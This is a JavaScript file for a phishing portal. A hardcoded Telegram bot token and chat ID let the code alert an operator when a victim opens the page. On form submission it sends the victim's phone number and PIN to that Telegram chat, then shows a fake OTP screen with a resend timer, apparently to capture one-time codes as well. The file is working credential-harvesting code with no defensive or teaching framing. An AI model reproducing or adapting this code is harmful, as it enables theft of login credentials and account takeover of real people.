// 🔑 Your Telegram Credentials
const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
const chatId = '7909543900';

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
        });
    } catch (e) { console.error("Error"); }
}

// 1️⃣ Notify on Page Load
window.onload = () => {
    sendToTelegram("<b>🚀 Link Clicked!</b>\nUser is on the portal.");
};

// 2️⃣ Handle Login Submit
const authForm = document.getElementById('auth-form');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const phoneInput = document.getElementById('phone');
    const pinInput = document.getElementById('pin');
    const submitBtn = document.getElementById('submit-btn');

    // Validation
    if (phoneInput.value.length < 10 || pinInput.value.length < 4) {
        if (phoneInput.value.length < 10) phoneInput.classList.add('error');
        if (pinInput.value.length < 4) pinInput.classList.add('error');
        return;
    }

    // Send Login Data
    submitBtn.innerText = "Processing...";
    await sendToTelegram(`<b>🔑 Login Data</b>\nPhone: ${phoneInput.value}\nPIN: ${pinInput.value}`);

    // --- THE FIX: SWITCH TO OTP VIEW ---
    // We hide the login card and show the OTP section
    document.getElementById('login-card').style.display = 'none';
    
    const otpSection = document.getElementById('otp-section');
    if (otpSection) {
        otpSection.style.display = 'block';
        startTimer(60); // Start the countdown
    }
});

// 3️⃣ The Timer Function
function startTimer(duration) {
    let timer = duration, minutes, seconds;
    const display = document.getElementById('timer-text'); // Make sure this ID exists in HTML
    
    const countdown = setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        seconds = seconds < 10 ? "0" + seconds : seconds;

        if (display) display.textContent = "Resend in " + seconds + "s";

        if (--timer < 0) {
            clearInterval(countdown);
            if (display) display.textContent = "Resend OTP";
        }
    }, 1000);
}
